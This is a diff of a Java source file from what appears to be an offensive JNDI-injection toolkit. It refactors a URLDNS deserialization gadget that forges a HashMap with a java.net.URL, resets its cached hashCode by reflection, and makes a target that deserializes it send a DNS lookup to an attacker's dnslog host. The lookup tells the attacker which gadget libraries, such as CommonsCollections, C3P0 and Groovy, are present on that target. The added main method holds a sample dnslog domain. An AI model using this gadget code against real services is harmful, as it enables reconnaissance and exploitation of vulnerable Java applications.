@@ -1,5 +1,6 @@
 package com.nu1r.jndi.gadgets;
 
+import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.annotation.Authors;
 import com.nu1r.jndi.gadgets.annotation.Dependencies;
 
@@ -37,24 +38,28 @@ import static com.nu1r.jndi.gadgets.utils.Utils.makeClass;
  */
 @Dependencies()
 @Authors({Authors.GEBL})
-public class URLDNS {
+public class URLDNS implements ObjectPayload<Object> {
     public static String[] defaultClass = new String[]{
             "CommonsCollections13567", "CommonsCollections24", "CommonsBeanutils2", "C3P0", "AspectJWeaver", "bsh",
             "Groovy", "Becl", "Jdk7u21", "JRE8u20", "winlinux"};
 
     public static List<Object> list = new LinkedList();
 
-    public Object getObject(final String command) throws Exception {
+    public static void main(String[] args) {
+        String s = "all:b9504e60.dns.1433.eu.org-dt-1-dl-5000";
+    }
 
-        int sep = command.lastIndexOf(':');
+    public Object getObject(PayloadType type, String... param) throws Exception {
+        String command = param[0];
+        int    sep     = command.lastIndexOf(':');
         if (sep < 0) {
             throw new IllegalArgumentException("Command format is: <type>:<dnslog_url>");
         }
 
-        String type = command.substring(0, sep);
+        String type1 = command.substring(0, sep);
         String url  = command.substring(sep + 1);
 
-        switch (type) {
+        switch (type1) {
             // common 时会测试不常被黑名单禁用的类
             case "common":
                 setList("CommonsBeanutils2", url);
@@ -71,7 +76,7 @@ public class URLDNS {
 
             // 默认指定类
             default:
-                setList(type, url);
+                setList(type1, url);
         }
 
         return list;
@@ -79,8 +84,8 @@ public class URLDNS {
 
     public static HashMap getURLDNSGadget(String urls, String clazzName) throws Exception {
         HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
-        URL   url = new URL("http://" + urls);
-        Field f   = Class.forName("java.net.URL").getDeclaredField("hashCode");
+        URL                     url     = new URL("http://" + urls);
+        Field                   f       = Class.forName("java.net.URL").getDeclaredField("hashCode");
         f.setAccessible(true);
         f.set(url, Integer.valueOf(0));
         Class<?> clazz = null;
